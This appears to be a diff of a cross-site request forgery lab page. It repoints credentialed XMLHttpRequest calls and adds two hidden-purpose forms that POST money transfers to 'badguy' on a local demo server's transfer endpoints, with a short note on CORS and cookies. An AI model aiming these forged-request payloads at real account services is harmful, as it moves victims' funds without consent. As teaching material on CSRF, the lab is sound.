@@ -4,7 +4,7 @@
     function postLevel3(withCredentials) {
         let request = new XMLHttpRequest();
         request.withCredentials = withCredentials;
-        request.open("POST", "https://noob-server-499444039048724483.deploys.app/api/transfer3");
+        request.open("POST", "http://localhost:1323/api/transfer3");
         request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
         request.send(JSON.stringify({ "to": "badguy", "amount": 500 }));
     }
@@ -12,11 +12,12 @@
     function postLevel4(withCredentials) {
         let request = new XMLHttpRequest();
         request.withCredentials = withCredentials;
-        request.open("POST", "https://noob-server-499444039048724483.deploys.app/api/transfer4");
+        request.open("POST", "http://localhost:1323/api/transfer4");
         request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
         request.setRequestHeader("X-Requested-With", "XMLHttpRequest");
         request.send(JSON.stringify({ "to": "badguy", "amount": 500 }));
     }
+
 </script>
 <body>
 
@@ -30,6 +31,18 @@
     If the server is CORS enabled, it will pass but to make sure browser send along the cookies use 'withCredentials'.<br>
     But the server need 'Access-Control-Allow-Credentials: true' header to allow this.
 </p>
+
+<form name="badform" method="POST" action="http://localhost:1323/api/transfer3">
+    <input type="input" name="to" value="badguy">
+    <input type="input" name="amount" value="1000">
+    <input type="submit" value="Submit 3">
+</form>
+
+<form name="badform" method="POST" action="http://localhost:1323/api/transfer4">
+    <input type="input" name="to" value="badguy">
+    <input type="input" name="amount" value="1000">
+    <input type="submit" value="Submit 4">
+</form>
 
 <a href="javascript:void(0);" onclick="postLevel3(true);">POST Level3</a><br>
 <a href="javascript:void(0);" onclick="postLevel4(true);">POST Level4</a><br>
